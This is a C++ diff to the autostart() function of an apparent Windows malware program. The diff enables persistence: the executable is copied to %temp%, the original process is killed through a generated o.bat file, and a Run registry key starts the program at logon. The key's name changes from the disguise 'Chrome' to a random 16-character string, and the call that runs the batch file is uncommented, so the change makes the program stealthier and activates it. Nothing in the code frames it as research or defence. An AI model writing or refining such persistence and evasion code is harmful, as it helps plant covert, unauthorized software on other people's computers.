@@ -275,6 +275,15 @@ string getStatus() {
     return status;
 }
 
+string random_string(int lenght) {
+    string random = "";
+    while (lenght--) {
+        char ran = rand() % 25 + 97;
+        random += ran;
+    }
+    return random;
+}
+
 void autostart() {
     string path;
     char username[256 + 1];
@@ -286,35 +295,33 @@ void autostart() {
 
     path = letter[0];
     path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
-    if (!filexits(path +"\\"+ get_exe())) {
+    if (!filexits(path + "\\" + get_exe())) {
         fstream file;
         file.open("o.bat", ios::out);
         file << "TASKKILL /F /IM " << get_exe() << endl
             << "move " << get_exe() << " %temp%" << endl
+            << "move " << "shitoo" << " %temp%" << endl
             << "start %temp%\\" + get_exe();
         file.close();
-        string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d %temp%\\" + get_exe();
+        string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
         system(cmd.c_str());
 
         char buffer[MAX_PATH];
         ::GetModuleFileNameA(NULL, buffer, MAX_PATH);
         string buff2(buffer);
-        buff2.erase(get_exe().size() - get_exe().size(), 256);
-        cout << "jd";
-        cout << buff2;
-        file.open(path+"\\shitoo");
+        buff2.erase(buff2.size() - get_exe().size(), 256);
+        file.open("shitoo", ios::out);
         file << buff2 + "o.bat";
         file.close();
-      //  system("o.bat");
+        system("o.bat");
     }
-    if (filexits(path+"\\shitoo")) {
+    if (filexits(path + "\\shitoo")) {
         fstream file;
         string path2;
-        file.open("shitoo");
+        file.open(path + "\\shitoo", ios::in);
         file >> path2;
         file.close();
-        path2 += "\\o.bat";
-        remove(path.c_str());
+        remove(path2.c_str());
         remove("shitoo");
     }
 }
